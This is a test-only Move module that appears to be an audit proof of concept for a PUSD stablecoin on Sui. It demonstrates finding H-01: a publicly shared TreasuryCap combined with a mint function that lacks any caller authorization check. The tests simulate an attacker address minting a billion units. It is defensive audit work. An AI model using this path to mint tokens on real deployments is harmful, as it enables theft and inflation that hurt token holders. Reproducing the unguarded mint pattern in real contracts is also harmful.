#[test_only]
module stablecoin::pusd_audit_poc_tests {
    //! PoC for human-confirmed finding:
    //! H-01: PUSD TreasuryCap shared + mint has no caller auth (pusd.move:20,23)
    //!
    //! Verification method: `sui move test` in move/stablecoin/.
    //! Pass == the vulnerable code path is reachable from an arbitrary
    //! address; the absence of any sender check inside `pusd::mint` is
    //! the bug surface. Combined with `init` sharing the TreasuryCap,
    //! any address can mint unbounded PUSD on mainnet.

    use sui::test_scenario::{Self, ctx};
    use stablecoin::pusd::{Self, PUSD};
    use sui::coin::{TreasuryCap, Coin, create_treasury_cap_for_testing};
    use sui::balance::supply_value;

    /// PoC — mint with attacker as `ctx.sender()` and attacker as recipient
    /// succeeds even though the caller has no admin/role/authorization.
    /// This exercises exactly the public surface of the bug.
    #[test]
    fun poc_attacker_mints_unauthorized() {
        let deployer = @0xA;
        let attacker = @0xB;

        // Deployer publishes the package. We model "the TreasuryCap is
        // accessible to the attacker" by handing the attacker a reference
        // to it — which on mainnet is what `transfer::public_share_object`
        // in `init` achieves (any address may take `&mut`).
        let mut scenario = test_scenario::begin(deployer);
        let treasury_cap = {
            let ctx = scenario.ctx();
            create_treasury_cap_for_testing<PUSD>(ctx)
        };
        sui::transfer::public_transfer(treasury_cap, attacker);

        // Attacker transaction: ctx.sender() == attacker.
        scenario.next_tx(attacker);
        {
            let mut treasury_cap =
                test_scenario::take_from_sender<TreasuryCap<PUSD>>(&scenario);
            let ctx = scenario.ctx();
            // No assert!(ctx.sender() == designated, …) inside `mint`.
            // The only check is `amount != 0`. So this call succeeds.
            let amount = 1_000_000_000;
            pusd::mint(&mut treasury_cap, attacker, amount, ctx);
            test_scenario::return_to_sender(&scenario, treasury_cap);
        };

        // Attacker now holds the freshly minted PUSD.
        scenario.next_tx(attacker);
        {
            let coin = test_scenario::take_from_sender<Coin<PUSD>>(&scenario);
            let value = coin.value();
            assert!(value == 1_000_000_000, 0);
            // Drain the supply back to dispose of the cap cleanly.
            scenario.next_tx(attacker);
            let mut treasury_cap =
                test_scenario::take_from_sender<TreasuryCap<PUSD>>(&scenario);
            let ctx = scenario.ctx();
            pusd::burn(&mut treasury_cap, coin, ctx);
            test_scenario::return_to_sender(&scenario, treasury_cap);
        };

        scenario.end();
    }

    /// Sanity check: confirm the in-source abort code is `0` (EZeroAmount)
    /// and that the only assertion inside `mint` is the zero-amount check
    /// — by exercising the one branch that *should* still abort.
    #[test]
    #[expected_failure(abort_code = pusd::EZeroAmount)]
    fun poc_only_zero_amount_is_checked() {
        let deployer = @0xA;
        let attacker = @0xB;
        let mut scenario = test_scenario::begin(deployer);
        let treasury_cap = {
            let ctx = scenario.ctx();
            create_treasury_cap_for_testing<PUSD>(ctx)
        };
        sui::transfer::public_transfer(treasury_cap, attacker);
        scenario.next_tx(attacker);
        {
            let mut treasury_cap =
                test_scenario::take_from_sender<TreasuryCap<PUSD>>(&scenario);
            let ctx = scenario.ctx();
            pusd::mint(&mut treasury_cap, attacker, 0, ctx);
            test_scenario::return_to_sender(&scenario, treasury_cap);
        };
        scenario.end();
    }
}
